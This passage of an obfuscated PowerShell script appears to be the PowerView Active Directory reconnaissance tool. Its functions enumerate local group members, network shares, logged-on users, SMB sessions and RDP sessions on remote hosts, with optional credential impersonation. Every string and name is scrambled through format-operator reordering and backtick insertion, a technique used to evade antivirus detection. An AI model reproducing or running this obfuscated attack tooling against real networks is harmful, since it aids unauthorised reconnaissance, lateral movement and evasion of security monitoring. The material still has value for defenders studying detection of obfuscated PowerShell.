                            ${mEM`BEr} | &("{1}{3}{2}{0}" -f'er','Add-M','b','em') ("{1}{0}{2}"-f 'pe','Notepro','rty') 'SID' ${siD`st`R`ING}
                            ${iSg`Ro`Up} = $(${IN`Fo}."Lg`RM`I`2_Si`dUSagE" -eq ("{2}{0}{1}{3}" -f 'yp','e','SidT','Group'))
                            ${mem`BER} | &("{2}{1}{0}"-f 'ber','Mem','Add-') ("{1}{0}{2}" -f 'pert','Notepro','y') ("{2}{0}{1}"-f'Gro','up','Is') ${iS`gRO`UP}
                            ${m`e`MbeR}."p`sobJ`ECT"."typE`NaM`Es".("{0}{1}" -f'In','sert').Invoke(0, ("{4}{0}{2}{3}{6}{1}{5}" -f'iew','r.AP','.Loc','alGr','PowerV','I','oupMembe'))
                            ${MEM`Be`RS} += ${MeM`BeR}
                        }
                    }

                    
                    ${NU`LL} = ${NEtA`pI`32}::("{0}{2}{3}{1}{4}"-f 'NetAp','r','i','Buffe','Free').Invoke(${P`Tri`Nfo})

                    
                    ${ma`CHiN`ESID} = ${ME`Mbe`RS} | &("{2}{1}{0}{3}"-f'-O','here','W','bject') {${_}."s`Id" -match ("{0}{1}"-f'.','*-500') -or (${_}."S`id" -match ("{0}{1}" -f '.*-5','01'))} | &("{2}{3}{0}{1}"-f'ect','-Object','Se','l') -Expand ("{1}{0}" -f'D','SI')
                    if (${m`ACH`I`NEsiD}) {
                        ${mAc`HiN`EsID} = ${M`AcH`In`eSID}.("{2}{1}{0}"-f 'ing','ubstr','S').Invoke(0, ${MAcHI`N`eSid}.("{1}{0}{2}"-f'st','La','IndexOf').Invoke('-'))

                        ${m`emBerS} | &("{0}{2}{1}"-f'ForEach-','bject','O') {
                            if (${_}."s`ID" -match ${MAch`in`esid}) {
                                ${_} | &("{1}{2}{0}" -f 'r','Add-','Membe') ("{1}{2}{0}"-f'ty','Noteprop','er') ("{0}{1}"-f'Is','Domain') ${fA`lsE}
                            }
                            else {
                                ${_} | &("{3}{0}{1}{2}"-f'-M','em','ber','Add') ("{1}{0}{2}{3}" -f 'otep','N','ropert','y') ("{2}{1}{0}"-f'n','omai','IsD') ${Tr`Ue}
                            }
                        }
                    }
                    else {
                        ${m`eMbe`Rs} | &("{2}{4}{3}{0}{1}"-f 'h-Obj','ect','For','ac','E') {
                            if (${_}."S`id" -notmatch ("{2}{0}{1}"-f'-1-','5-21','S')) {
                                ${_} | &("{1}{0}{2}"-f '-Me','Add','mber') ("{2}{0}{1}"-f'pert','y','Notepro') ("{1}{2}{0}"-f 'omain','I','sD') ${fAl`Se}
                            }
                            else {
                                ${_} | &("{1}{2}{0}"-f 'ember','Add-','M') ("{2}{1}{0}" -f'rty','rope','Notep') ("{2}{0}{1}"-f 'D','omain','Is') ("{2}{1}{0}"-f 'OWN','N','UNK')
                            }
                        }
                    }
                    ${M`embERs}
                }
                else {
                    &("{1}{0}{2}{3}"-f 'i','Wr','te','-Verbose') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    ${G`ROuP`p`R`OVider} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${gRoupp`ROV`IdEr}."PSB`ASE"."invO`ke"(("{0}{1}" -f 'Memb','ers')) | &("{0}{2}{1}"-f 'Fo','t','rEach-Objec') {

                        ${MeM`B`Er} = &("{2}{1}{0}"-f'w-Object','e','N') ("{2}{0}{1}"-f'e','ct','PSObj')
                        ${m`eMbEr} | &("{0}{1}{2}{3}"-f 'A','d','d-','Member') ("{2}{0}{1}" -f'otepr','operty','N') ("{0}{1}{2}"-f'Compu','terNam','e') ${COM`P`UTer}
                        ${MEM`B`Er} | &("{0}{1}{3}{2}" -f'A','d','er','d-Memb') ("{0}{1}{2}"-f'Notep','r','operty') ("{2}{3}{0}{1}"-f'am','e','Grou','pN') ${g`ROUp`NaME}

                        ${lo`CAL`USeR} = ([ADSI]${_})
                        ${Ads`pa`TH} = ${Local`U`ser}.("{0}{2}{1}"-f'Invo','et','keG').Invoke(("{0}{1}" -f'Ads','Path')).("{1}{0}" -f 'lace','Rep').Invoke(("{0}{1}"-f'W','inNT://'), '')
                        ${iS`G`RouP} = (${loCA`Lu`sEr}."sCHE`m`AclAsSN`Ame" -like ("{1}{0}" -f 'oup','gr'))

                        if((  ( &("{0}{1}" -f'di','R') ("vA"+"RIABl"+"e:2p"+"945") )."vAL`Ue"::("{0}{1}{2}" -f'Ma','tche','s').Invoke(${ad`Sp`AtH}, '/'))."cO`Unt" -eq 1) {
                            
                            ${M`EMB`E`Risd`OMAIn} = ${T`Rue}
                            ${na`me} = ${ad`S`path}.("{1}{0}" -f 'ace','Repl').Invoke('/', '\')
                        }
                        else {
                            
                            ${MEmBEr`iSd`oM`AIn} = ${FaL`Se}
                            ${n`AME} = ${ad`s`PaTH}.("{0}{1}{2}"-f'Sub','st','ring').Invoke(${A`d`SPAtH}.("{0}{1}" -f'I','ndexOf').Invoke('/')+1).("{1}{2}{0}"-f'ace','R','epl').Invoke('/', '\')
                        }

                        ${mEm`BEr} | &("{1}{0}{2}"-f 'dd-M','A','ember') ("{0}{2}{3}{1}"-f 'No','ty','tep','roper') ("{1}{0}{2}" -f'unt','Acco','Name') ${NA`ME}
                        ${m`EmBer} | &("{2}{0}{1}" -f 'dd-','Member','A') ("{1}{3}{2}{0}" -f'erty','No','rop','tep') 'SID' ((&("{2}{0}{1}"-f'ew-Obj','ect','N') ("{2}{6}{8}{0}{1}{3}{9}{7}{5}{4}"-f 'curity.Princ','ipal.S','System','ec','r','Identifie','.S','rity','e','u')(${lO`C`ALUSer}.("{0}{1}{2}" -f'In','vo','keGet').Invoke(("{0}{1}"-f'Object','SID')),0))."V`AlUe")
                        ${m`EMBEr} | &("{1}{2}{0}" -f'ember','Add-','M') ("{1}{2}{0}{3}" -f 'er','N','oteprop','ty') ("{1}{0}"-f 'p','IsGrou') ${isG`RO`Up}
                        ${M`E`Mber} | &("{0}{2}{1}" -f'A','ember','dd-M') ("{1}{2}{0}"-f'y','Noteproper','t') ("{2}{0}{1}"-f'sDoma','in','I') ${meMb`Eri`sdo`m`AIn}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${meM`B`eR}
                    }
                }
                catch {
                    &("{2}{4}{1}{3}{0}"-f 'e','-Verb','Wri','os','te') ('[Get-N'+'e'+'tL'+'ocalG'+'roupM'+'em'+'ber] '+'Er'+'ror '+'f'+'or '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${L`ogoNto`K`EN}) {
            &("{1}{4}{5}{3}{0}{2}" -f 'ver','In','tToSelf','Re','vok','e-') -TokenHandle ${l`Og`oNTo`ken}
        }
    }
}


function G`Et-ne`TSHARE {


    [OutputType({"{0}{4}{1}{5}{2}{3}" -f'P','er','Shar','eInfo','ow','View.'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitION = 0, VAluefroMpIpeLINe = ${T`RUe}, VaLUEfRomPiPElINEBypROPERTyNamE = ${T`RUE})]
        [Alias({"{1}{2}{0}"-f 'me','Ho','stNa'}, {"{3}{2}{1}{0}" -f'ame','ostn','nsh','d'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oM`p`UTER`NaMe} = ("{0}{1}" -f 'lo','calhost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedE`Nt`Ial} =  ${jh`3x`o6}::"Emp`TY"
    )

    BEGIN {
        if (${P`sBOUNDPArA`MEtE`Rs}[("{2}{0}{1}"-f 'edentia','l','Cr')]) {
            ${loG`onToK`en} = &("{4}{3}{1}{5}{2}{0}" -f 'nation','oke-','mperso','v','In','UserI') -Credential ${cRe`D`EnTIal}
        }
    }

    PROCESS {
        ForEach (${CoM`p`U`Ter} in ${coM`P`UtErN`Ame}) {
            
            ${Q`UEryL`ev`eL} = 1
            ${pTR`In`Fo} =  (&("{1}{0}"-f'Em','iT')  ("{3}{2}{1}{0}"-f'Q','z','r','vARiABlE:9')  )."vAL`UE"::"Ze`Ro"
            ${e`NTri`Esr`EAd} = 0
            ${toTA`Lr`eAd} = 0
            ${resUMEh`And`lE} = 0

            
            ${Res`ULt} = ${nE`TAP`I32}::"nETs`HAR`EEN`Um"(${CoMPu`TeR}, ${Q`Ueryl`EVEL}, [ref]${pt`R`iNfo}, -1, [ref]${eNt`RI`ESR`eaD}, [ref]${Tot`A`LReAD}, [ref]${rE`s`Um`eHanDLE})

            
            ${Off`set} = ${P`TRi`NfO}.("{1}{2}{0}" -f'4','To','Int6').Invoke()

            
            if ((${rES`UlT} -eq 0) -and (${oF`FSEt} -gt 0)) {

                
                ${IN`crE`MenT} = ${SHare`_I`N`FO`_1}::("{1}{2}{0}" -f'Size','G','et').Invoke()

                
                for (${I} = 0; (${I} -lt ${enT`R`ies`REAd}); ${i}++) {
                    
                    ${newI`NtP`TR} = &("{1}{2}{0}"-f'ect','New','-Obj') ("{2}{0}{1}{4}{3}"-f'yst','em','S','Intptr','.') -ArgumentList ${O`Ff`SeT}
                    ${In`FO} = ${N`ewI`N`TPtR} -as ${s`HAR`e_I`Nfo`_1}

                    
                    ${S`hA`RE} = ${i`NfO} | &("{1}{2}{0}{3}" -f 'jec','Select-O','b','t') ('*')
                    ${SH`A`RE} | &("{2}{0}{1}" -f'em','ber','Add-M') ("{1}{3}{0}{2}" -f 'ropert','Note','y','p') ("{0}{1}{2}{3}" -f 'Com','p','uter','Name') ${Co`M`pUt`er}
                    ${sH`A`RE}."P`SOBjECt"."T`yPENAM`ES".("{2}{0}{1}"-f 'er','t','Ins').Invoke(0, ("{1}{0}{3}{2}"-f 'erView.Shar','Pow','nfo','eI'))
                    ${oF`F`set} = ${NewI`NtP`TR}.("{2}{0}{1}"-f'In','t64','To').Invoke()
                    ${o`FFSeT} += ${i`Ncre`mENT}
                    ${sHA`Re}
                }

                
                ${n`UlL} = ${NETa`PI32}::("{2}{0}{4}{3}{1}" -f'e','ferFree','N','iBuf','tAp').Invoke(${p`TrIn`Fo})
            }
            else {
                &("{4}{0}{3}{2}{1}"-f 'i','ose','-Verb','te','Wr') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${LoGoN`TOK`EN}) {
            &("{4}{1}{3}{5}{2}{0}" -f 'f','e-Reve','el','rtTo','Invok','S') -TokenHandle ${lOGo`Nt`o`Ken}
        }
    }
}


function gE`T-N`Et`lOGge`dOn {


    [OutputType({"{3}{4}{5}{0}{2}{1}"-f'ew.Logged','rInfo','OnUse','Pow','e','rVi'})]
    [CmdletBinding()]
    Param(
        [Parameter(positIOn = 0, VALUEFroMpipELINe = ${t`RuE}, VAlUEfROMPiPeLiNEBYPROPerTYNAME = ${T`Rue})]
        [Alias({"{1}{0}" -f 'Name','Host'}, {"{0}{1}{2}" -f'd','nshostnam','e'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OmpUTER`Na`Me} = ("{2}{0}{1}"-f 'hos','t','local'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDEnT`I`AL} =   ${j`h3`xo6}::"E`mPty"
    )

    BEGIN {
        if (${psbo`UnDpARAM`E`T`ErS}[("{1}{2}{0}"-f'ial','C','redent')]) {
            ${lO`GOnT`OK`eN} = &("{6}{2}{3}{4}{5}{0}{1}"-f 'atio','n','voke','-UserI','m','person','In') -Credential ${C`RED`enTial}
        }
    }

    PROCESS {
        ForEach (${c`om`P`UTer} in ${CoMp`UTeR`N`A`mE}) {
            
            ${qUe`Ry`lEveL} = 1
            ${Pt`RiN`Fo} =   ( &("{2}{1}{0}" -f 'em','-it','GEt') ('Va'+'R'+'iaBlE:9rZQ'))."V`AluE"::"z`eRo"
            ${eNT`RIESRe`Ad} = 0
            ${T`o`TalReaD} = 0
            ${rE`SUM`EH`AnDle} = 0

            
            ${REsu`LT} = ${N`ET`APi32}::"n`ET`w`kStAuSeRenuM"(${CO`mPU`TeR}, ${qUe`R`y`LevEL}, [ref]${p`TRInFo}, -1, [ref]${entRiE`sr`eaD}, [ref]${tOTal`RE`AD}, [ref]${reSU`mEHAN`dLe})

            
            ${O`FfSet} = ${P`Trin`Fo}.("{1}{0}"-f't64','ToIn').Invoke()

            
            if ((${r`Esu`LT} -eq 0) -and (${oF`FSet} -gt 0)) {

                
                ${iN`Cre`m`eNT} = ${wkst`A`_`UseR_inFo_1}::("{0}{1}{2}"-f'G','etSiz','e').Invoke()

                
                for (${i} = 0; (${I} -lt ${EN`TRIeSr`e`AD}); ${i}++) {
                    
                    ${N`e`WiNTpTr} = &("{0}{1}{3}{2}" -f 'New-O','b','t','jec') ("{1}{0}{2}"-f't','System.In','ptr') -ArgumentList ${OF`FS`Et}
                    ${in`FO} = ${N`EwiNt`p`Tr} -as ${WkS`TA_`Use`R_`inFO_1}

                    
                    ${Lo`Gg`ED`On} = ${in`FO} | &("{0}{1}{2}"-f 'Selec','t-Ob','ject') ('*')
                    ${l`oGG`eDoN} | &("{2}{0}{1}" -f'-Me','mber','Add') ("{1}{3}{2}{0}" -f 'y','Notepro','ert','p') ("{1}{3}{0}{2}" -f'am','Co','e','mputerN') ${C`OMPut`ER}
                    ${lo`g`gEDON}."Pso`BJECt"."TY`P`eNam`eS".("{0}{1}" -f'I','nsert').Invoke(0, ("{2}{1}{6}{0}{5}{3}{4}" -f 'w','er','Pow','dOnUser','Info','.Logge','Vie'))
                    ${O`F`FSEt} = ${nEWIn`Tp`TR}.("{2}{1}{0}"-f'nt64','I','To').Invoke()
                    ${OFf`Set} += ${IN`CR`EmeNt}
                    ${lo`G`GEDoN}
                }

                
                ${Nu`Ll} = ${NETaPi`32}::("{1}{0}{3}{2}" -f'iBuff','NetAp','ree','erF').Invoke(${Ptri`N`FO})
            }
            else {
                &("{0}{2}{3}{1}" -f 'Wr','ose','ite-','Verb') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${Lo`GONtO`KEN}) {
            &("{1}{3}{0}{2}"-f'rtT','Invoke-Rev','oSelf','e') -TokenHandle ${LoG`ont`okEN}
        }
    }
}


function G`Et-net`SEsSIOn {


    [OutputType({"{1}{3}{4}{0}{5}{2}" -f 'i','Pow','o','e','rV','ew.SessionInf'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTION = 0, VAlUefROmPipeLInE = ${tr`UE}, VALUEfrOMpIPeliNebypROpeRTYNaME = ${T`Rue})]
        [Alias({"{1}{0}{2}" -f'o','H','stName'}, {"{0}{2}{3}{1}" -f'd','name','n','shost'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${com`Pute`RN`Ame} = ("{2}{1}{0}" -f 'lhost','oca','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`DeNt`IaL} =  (  &('gi') ("{1}{0}{2}{3}" -f'e:','VaRiabl','JH','3Xo6') )."v`AlUE"::"eMp`TY"
    )

    BEGIN {
        if (${PSB`O`UNDPA`RA`mE`TerS}[("{2}{0}{3}{1}"-f 'ed','al','Cr','enti')]) {
            ${l`OG`ON`TokEN} = &("{2}{4}{5}{1}{0}{3}"-f'tio','a','Invok','n','e-User','Imperson') -Credential ${c`ReDEnt`iAL}
        }
    }

    PROCESS {
        ForEach (${c`o`MpUtER} in ${c`OmPUt`ErnamE}) {
            
            ${Qu`eRYlE`VEl} = 10
            ${p`T`RinfO} =   (&("{1}{0}" -f 'CI','g')  ("{3}{0}{2}{1}" -f'AR','9RZQ','iabLe:','V') )."Val`Ue"::"Z`eRo"
            ${Ent`R`i`esREAd} = 0
            ${tOT`Al`ReAD} = 0
            ${re`sUm`E`HandLE} = 0

            
            ${r`E`Sult} = ${NE`TaP`I32}::"neTs`ESSI`O`NEnum"(${Co`m`PuTer}, '', ${U`S`ErNAME}, ${Q`Uerylev`eL}, [ref]${P`TRI`NfO}, -1, [ref]${ENtr`i`eSRe`AD}, [ref]${tOT`A`Lr`EaD}, [ref]${Res`Um`e`ha`NDle})

            
            ${o`F`FSeT} = ${p`TrIn`Fo}.("{1}{0}" -f'Int64','To').Invoke()

            
            if ((${rESU`lt} -eq 0) -and (${O`FfSEt} -gt 0)) {

                
                ${IN`Cr`EMeNT} = ${seSsi`oN_`IN`F`O_10}::("{0}{1}{2}" -f'GetSi','z','e').Invoke()

                
                for (${i} = 0; (${I} -lt ${e`N`TrIEs`ReAD}); ${I}++) {
                    
                    ${N`e`wIn`TPTr} = &("{3}{1}{0}{2}"-f'b','ew-O','ject','N') ("{2}{3}{1}{0}" -f 'tptr','In','Sy','stem.') -ArgumentList ${o`Ff`seT}
                    ${In`Fo} = ${newI`N`T`ptR} -as ${sessION_`I`Nfo`_10}

                    
                    ${sE`ss`Ion} = ${i`NfO} | &("{3}{0}{1}{2}" -f'ct-Ob','j','ect','Sele') ('*')
                    ${S`eSsIoN} | &("{1}{2}{0}"-f'r','Add-Me','mbe') ("{2}{0}{1}" -f'p','erty','Notepro') ("{0}{1}{2}"-f'Compu','te','rName') ${CoM`pu`Ter}
                    ${SesS`i`On}."P`sOB`jecT"."Ty`pEn`AmeS".("{1}{0}{2}" -f'nse','I','rt').Invoke(0, ("{2}{0}{1}{4}{3}"-f 'o','nI','PowerView.Sessi','o','nf'))
                    ${oFfs`Et} = ${N`EW`inTPTr}.("{2}{0}{1}"-f 'oInt','64','T').Invoke()
                    ${o`F`FSEt} += ${I`N`c`REMEnt}
                    ${sESS`i`oN}
                }

                
                ${N`ULl} = ${ne`Tap`i32}::("{2}{0}{3}{4}{1}" -f'etA','erFree','N','piBu','ff').Invoke(${P`T`RINfO})
            }
            else {
                &("{2}{4}{0}{3}{1}"-f'-','se','Wri','Verbo','te') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${lOg`ON`ToKen}) {
            &("{2}{1}{3}{0}" -f'ToSelf','k','Invo','e-Revert') -TokenHandle ${LO`G`oNtOkEn}
        }
    }
}


function GE`T`-reGL`ogg`edon {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f's','PS','houldProces','S'}, '')]
    [OutputType({"{4}{2}{0}{3}{5}{1}" -f 'L','User','erView.Reg','ogge','Pow','dOn'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitION = 0, vAluefRomPiPELIne = ${t`RUe}, valUeFROmpIPELINeBYPrOpErTyName = ${Tr`Ue})]
        [Alias({"{2}{1}{0}"-f'me','Na','Host'}, {"{1}{2}{3}{0}" -f'e','dn','shostn','am'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`M`p`UterNa`mE} = ("{1}{0}"-f'lhost','loca')
    )

    BEGIN {
        if (${Ps`B`o`Un`dP`ARaMeTERs}[("{0}{1}{2}"-f 'C','redent','ial')]) {
            ${lo`gO`Nt`oKen} = &("{6}{1}{4}{3}{5}{0}{2}" -f'o','mpers','n','t','ona','i','Invoke-UserI') -Credential ${cR`EDent`IAl}
        }
    }

    PROCESS {
        ForEach (${C`OmpU`Ter} in ${C`o`mPUt`eR`NAMe}) {
            try {
                
                ${R`Eg} =   (&("{1}{0}"-f 'ariabLE','v')  ('M'+'6u') -VALU)::("{2}{1}{3}{0}{4}"-f'BaseK','Re','Open','mote','ey').Invoke(("{0}{1}"-f 'Us','ers'), "$ComputerName")

                
                ${r`Eg}.("{1}{0}{2}"-f 'SubK','Get','eyNames').Invoke() | &("{2}{1}{0}{3}"-f'r','he','W','e-Object') { ${_} -match (('S-1-'+'5-21-['+'0'+'-9]+-[0-9]'+'+'+'-[0-'+'9]+'+'-'+'[0'+'-9]+75o')."R`EpLA`CE"(([char]55+[char]53+[char]111),'$')) } | &("{3}{1}{4}{0}{2}"-f 'b','ac','ject','ForE','h-O') {
                    ${U`SERNAMe} = &("{2}{0}{3}{1}"-f 'ert','-SID','Conv','From') -ObjectSID ${_} -OutputType ("{0}{1}{2}{3}" -f 'Doma','in','Simpl','e')

                    if (${u`SE`Rn`AMe}) {
                        ${uSe`Rn`AmE}, ${U`sErD`oM`Ain} = ${u`sEr`NaME}.("{1}{0}"-f'it','Spl').Invoke('@')
                    }
                    else {
                        ${uSeR`N`Ame} = ${_}
                        ${User`Dom`AIn} = ${n`ULL}
                    }

                    ${reGlOg`gED`on`U`SeR} = &("{2}{0}{1}"-f'w','-Object','Ne') ("{0}{2}{1}" -f'PSObj','t','ec')
                    ${rEgl`oGgeDo`NusEr} | &("{2}{0}{1}"-f'Membe','r','Add-') ("{1}{0}{2}{3}"-f'p','Notepro','er','ty') ("{2}{3}{0}{1}"-f'put','erName','C','om') "$ComputerName"
                    ${R`eGlOGGEDO`NUS`eR} | &("{0}{2}{1}" -f'A','ber','dd-Mem') ("{3}{0}{1}{2}"-f'prope','r','ty','Note') ("{1}{2}{0}{3}" -f'ma','U','serDo','in') ${us`E`RDOmAiN}
                    ${rE`GlogGE`D`Onu`Ser} | &("{0}{1}{2}" -f'Add','-Memb','er') ("{2}{1}{0}" -f'y','opert','Notepr') ("{1}{0}" -f'e','UserNam') ${uS`ER`Name}
                    ${RE`GLogGe`dOn`USer} | &("{0}{2}{1}" -f'A','mber','dd-Me') ("{0}{2}{1}" -f 'Not','perty','epro') ("{1}{0}"-f 'SID','User') ${_}
                    ${REGLOggEdo`N`U`SEr}."P`SOBJe`CT"."t`YPE`NaMEs".("{0}{1}" -f'In','sert').Invoke(0, ("{2}{3}{4}{0}{1}"-f 'se','r','PowerV','iew.RegLoggedO','nU'))
                    ${r`egloG`Ge`dONUSEr}
                }
            }
            catch {
                &("{0}{2}{1}{3}"-f 'W','ite','r','-Verbose') ('['+'Get-R'+'e'+'gLogge'+'dO'+'n] '+'E'+'rror '+'open'+'ing'+' '+'r'+'emote '+'reg'+'i'+'stry '+'o'+'n '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${lO`gO`Nt`oKeN}) {
            &("{2}{0}{1}{3}{4}" -f'v','ertT','Invoke-Re','oS','elf') -TokenHandle ${L`oG`ontOkeN}
        }
    }
}


function GET`-Ne`TrdPSEsS`IOn {


    [OutputType({"{5}{2}{0}{7}{4}{3}{1}{6}" -f 'DP','onI','w.R','i','ess','PowerVie','nfo','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItION = 0, VaLuEFromPiPELiNe = ${t`RUe}, vALueFrOMPiPElInEbyprOPErtynAme = ${TR`Ue})]
        [Alias({"{0}{2}{1}" -f'Host','me','Na'}, {"{2}{0}{3}{1}" -f 't','ame','dnshos','n'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Com`pUTErNA`Me} = ("{1}{0}" -f'ost','localh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDE`N`TIAL} =  (  &("{2}{1}{0}" -f'teM','T-i','gE') ('VariabL'+'E:'+'Jh3'+'XO'+'6'))."VAl`UE"::"eMP`TY"
    )

    BEGIN {
        if (${pSb`Oun`dP`AR`AmetErS}[("{2}{0}{1}"-f 'redentia','l','C')]) {
            ${lO`Go`NToken} = &("{4}{0}{3}{1}{2}" -f 'er','rsona','tion','Impe','Invoke-Us') -Credential ${cR`ED`eN`Tial}
        }
    }

    PROCESS {
        ForEach (${co`mPUt`ER} in ${C`o`mPutEr`Name}) {

            
            ${h`AnD`Le} = ${wTs`API`32}::("{1}{3}{4}{2}{0}" -f'rEx','W','nServe','T','SOpe').Invoke(${co`mPuTer})

            
            if (${h`ANdlE} -ne 0) {

                
                ${PpseSs`io`NIN`Fo} =  (  &("{1}{0}"-f'I','gc')  ("Va"+"RIa"+"BL"+"e"+":9Rzq") )."v`ALue"::"z`ero"
                ${pco`UNt} = 0

                
                ${r`Es`Ult} = ${wt`SAPi`32}::"wt`Se`NuMe`RAteS`ESs`iO`NseX"(${han`dle}, [ref]1, 0, [ref]${PPSeSSI`O`Ni`N`Fo}, [ref]${p`C`OUNT});${L`ASte`Rr`oR} =  (&("{1}{0}" -f 'IR','d')  ("V"+"aRI"+"A"+"Ble:XznLs")  )."Va`Lue"::("{5}{1}{2}{3}{4}{0}"-f 'n32Error','L','as','t','Wi','Get').Invoke()

                
                ${Offs`ET} = ${p`Pse`SsiOni`NFo}.("{1}{0}" -f 'oInt64','T').Invoke()

                if ((${r`esUlT} -ne 0) -and (${o`FfS`ET} -gt 0)) {

                    
                    ${InCr`E`ME`NT} = ${Wt`S_`SeSsi`ON_`iNfO_1}::("{0}{1}{2}"-f'G','etSi','ze').Invoke()

                    
                    for (${i} = 0; (${i} -lt ${PC`ount}); ${I}++) {

                        
                        ${nEwiNT`P`Tr} = &("{0}{1}{3}{2}" -f 'Ne','w','ect','-Obj') ("{2}{3}{0}{1}"-f'm.Intpt','r','S','yste') -ArgumentList ${O`FF`sEt}
                        ${i`Nfo} = ${N`ewiN`Tp`Tr} -as ${Wt`S_SE`SsIO`N_I`NFo_1}

                        ${rD`p`s`EssiOn} = &("{1}{2}{0}"-f 'ect','New-O','bj') ("{0}{1}" -f 'P','SObject')

                        if (${In`Fo}."phO`sTNA`ME") {
                            ${R`d`P`seSsIoN} | &("{1}{0}{2}" -f'dd-Membe','A','r') ("{1}{3}{0}{2}"-f'op','No','erty','tepr') ("{0}{1}{2}"-f'Com','pute','rName') ${i`Nfo}."PHo`StNAme"
                        }
                        else {
                            
                            ${Rdps`esSi`oN} | &("{1}{3}{0}{2}"-f 'e','Add','r','-Memb') ("{2}{3}{1}{0}" -f 'erty','rop','Note','p') ("{1}{2}{0}" -f'Name','Comput','er') ${com`P`U`TEr}
                        }

                        ${rDpSeSS`I`On} | &("{1}{2}{0}"-f 'ember','Add','-M') ("{1}{3}{0}{2}" -f'o','N','perty','otepr') ("{1}{2}{0}{3}" -f'ionNa','Ses','s','me') ${iN`FO}."p`S`ESsIO`NnAmE"

                        if ($(-not ${I`NFO}."p`DoM`AinnA`ME") -or (${in`FO}."PDomaI`Nn`AmE" -eq '')) {
                            
                            ${R`dPSESSI`On} | &("{1}{0}{2}" -f 'dd-Memb','A','er') ("{3}{2}{1}{0}" -f'rty','pe','ro','Notep') ("{0}{2}{1}" -f 'U','erName','s') "$($Info.pUserName)"
                        }
                        else {
                            ${r`DpS`eSSIOn} | &("{2}{0}{1}"-f'dd-Me','mber','A') ("{2}{3}{0}{1}"-f 'oper','ty','Note','pr') ("{1}{0}{2}" -f 'm','UserNa','e') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${rD`p`SesSIoN} | &("{2}{1}{0}"-f'er','b','Add-Mem') ("{0}{3}{1}{2}" -f'Not','prope','rty','e') 'ID' ${In`Fo}."sESs`i`ONID"
                        ${rd`ps`eS`Sion} | &("{2}{0}{3}{1}" -f 'M','mber','Add-','e') ("{0}{3}{2}{1}" -f 'No','ty','oper','tepr') ("{1}{0}"-f 'e','Stat') ${In`Fo}."sTA`TE"

                        ${Pp`Bu`FFEr} =  (&("{1}{0}" -f 'tem','I')  ("{4}{1}{2}{3}{0}"-f 'rzQ','A','RIaBlE',':9','V')  )."VAl`UE"::"Z`erO"
                        ${PBYtesRetu`R`N`ED} = 0

                        
                        
                        ${rES`U`LT2} = ${WTsa`Pi`32}::"w`T`s`QU`eRyS`ESS`IoninFor`mAtiON"(${han`d`LE}, ${In`FO}."SeSsIo`N`Id", 14, [ref]${ppB`UFfEr}, [ref]${p`BYtE`SRet`Urned});${lAstErr`O`R2} =   ${xZN`LS}::("{4}{0}{2}{1}{3}{5}" -f'etLastWin','E','32','r','G','ror').Invoke()

                        if (${R`esU`lt2} -eq 0) {
                            &("{1}{4}{2}{0}{3}" -f'-Verb','Wr','e','ose','it') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${o`FFS`ET2} = ${PP`Bu`FfeR}.("{1}{0}{2}"-f 'In','To','t64').Invoke()
                            ${N`e`W`inTptr2} = &("{2}{0}{3}{1}" -f'w-O','ject','Ne','b') ("{0}{1}{4}{2}{3}"-f'Sy','ste','p','tr','m.Int') -ArgumentList ${offsE`T2}
                            ${I`N`Fo2} = ${newI`NT`PT`R2} -as ${wts_CLienT_`A`D`dRE`Ss}

                            ${souRc`Eip} = ${I`N`Fo2}."A`DD`Ress"
                            if (${s`oUr`CEIp}[2] -ne 0) {
                                ${sO`Ur`CeIp} = [String]${so`UrC`eIp}[2]+'.'+[String]${s`OURce`ip}[3]+'.'+[String]${SouR`CEip}[4]+'.'+[String]${So`U`RCEIp}[5]
                            }
                            else {
                                ${sO`UR`CeIP} = ${Nu`Ll}
                            }

                            ${RdPs`E`ssioN} | &("{2}{1}{0}" -f 'ember','M','Add-') ("{1}{0}{2}"-f 'opert','Notepr','y') ("{2}{0}{1}"-f 'r','ceIP','Sou') ${Sou`Rc`eIp}
                            ${r`dPseSsi`oN}."p`so`Bject"."tYPEn`A`MES".("{1}{0}{2}" -f'se','In','rt').Invoke(0, ("{5}{4}{3}{0}{2}{1}" -f'DPS','ssionInfo','e','.R','rView','Powe'))
                            ${Rdp`seS`Sion}

                            
                            ${nu`ll} = ${W`T`saPI`32}::("{2}{0}{3}{4}{1}"-f 'Fr','ory','WTS','e','eMem').Invoke(${p`PBuFf`ER})

                            ${O`Ff`SET} += ${INcrEm`e`Nt}
                        }
                    }
                    
